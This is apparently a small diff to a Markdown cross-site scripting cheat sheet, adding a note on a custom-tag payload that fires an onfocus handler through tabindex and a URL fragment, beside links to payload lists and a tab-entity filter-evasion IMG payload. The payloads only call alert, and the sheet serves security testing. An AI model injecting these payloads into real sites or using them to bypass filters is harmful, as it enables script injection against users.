@@ -2,6 +2,11 @@
 https://github.com/payloadbox/xss-payload-list
 ##### For filter bypass
 https://github.com/terjanq/Tiny-XSS-Payloads
+###### Key Note
+```tabindex="1"```, ```id="a1"```, ```#a1```
+```
+<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">
+```
 ## XSS with filter evasion
 ```
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
